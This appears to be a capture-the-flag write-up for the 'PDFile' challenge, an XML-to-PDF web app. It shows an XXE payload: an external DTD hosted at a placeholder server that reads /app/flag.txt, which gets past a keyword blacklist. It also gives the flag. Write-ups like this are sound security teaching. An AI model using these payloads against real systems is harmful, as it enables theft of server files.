# PDFile

## Description
> *I've recently developed a XML to PDF utility, I'll probably add payments to it soon!*

**URL:** https://pdfile.ctf.pascalctf.it

**Files:** [pdfile.zip](./orig/pdfile.zip)

## Solution
**TL;DR**: XXE injection via external DTD to bypass blacklist filter

1. The app parses XML with `resolve_entities=True` and `no_network=False`, making it vulnerable to XXE
2. A blacklist blocks keywords like `flag`, `file`, `etc` in the uploaded XML content
3. The bypass is using an external DTD - the blacklist only checks the uploaded content, not fetched resources
4. Host a malicious DTD on an external server containing:
   ```xml
   <!ENTITY exfil SYSTEM "file:///app/flag.txt">
   ```
5. Upload a `.pasx` file that references the external DTD:
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE book [
     <!ENTITY % xxe SYSTEM "http://YOUR_SERVER/xxe.dtd">
     %xxe;
   ]>
   <book>
     <title>&exfil;</title>
     <author>Test</author>
     <year>2026</year>
     <chapters>
       <chapter number="1">
         <title>Ch1</title>
         <content>Content</content>
       </chapter>
     </chapters>
   </book>
   ```
6. The flag appears in the PDF title field

### Flag
> `pascalCTF{xml_t0_pdf_1s_th3_n3xt_b1g_th1ng}`
